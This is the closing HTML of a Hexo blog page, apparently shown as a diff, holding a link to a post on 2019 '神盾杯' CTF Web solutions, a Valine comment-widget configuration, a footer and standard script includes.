href="/2019/06/14/2019%E2%80%9C%E7%A5%9E%E7%9B%BE%E6%9D%AF%E2%80%9Dctf-Web/"><span>2019 &quot;神盾杯&quot;上海市网络空间安全竞赛 Web部分题解</span><i class="fa fa-chevron-right"></i></a></div></nav><div id="vcomment"></div><script src="https://cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js"></script><script>var notify = 'true' == true ? true : false;
+var verify = 'false' == true ? true : false;
+var GUEST_INFO = ['nick','mail','link'];
+var guest_info = 'nick,mail,link'.split(',').filter(function(item){
+  return GUEST_INFO.indexOf(item) > -1
+});
+guest_info = guest_info.length == 0 ? GUEST_INFO :guest_info;
+window.valine = new Valine({
+  el:'#vcomment',
+  notify:notify,
+  verify:verify,
+  appId:'piszMlsB7MhecwDRlz0IFCop-gzGzoHsz',
+  appKey:'PHmvwpbyTPCcD3D52L1CoTlp',
+  placeholder:'Just go go',
+  avatar:'wavatar',
+  guest_info:guest_info,
+  pageSize:'10',
+  lang: 'zh-cn'
+})</script></div></div><footer><div class="layout" id="footer"><div class="copyright">&copy;2013 - 2019 By Somnus</div><div class="framework-info"><span>驱动 - </span><a href="http://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody" target="_blank" rel="noopener"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.6.1"></script><script src="/js/fancybox.js?version=1.6.1"></script><script src="/js/sidebar.js?version=1.6.1"></script><script src="/js/copy.js?version=1.6.1"></script><script src="/js/fireworks.js?version=1.6.1"></script><script src="/js/transition.js?version=1.6.1"></script><script src="/js/scroll.js?version=1.6.1"></script><script src="/js/head.js?version=1.6.1"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
+  $('#nav').addClass('is-mobile')
+  $('footer').addClass('is-mobile')
+  $('#top-container').addClass('is-mobile')
+}</script></body></html>
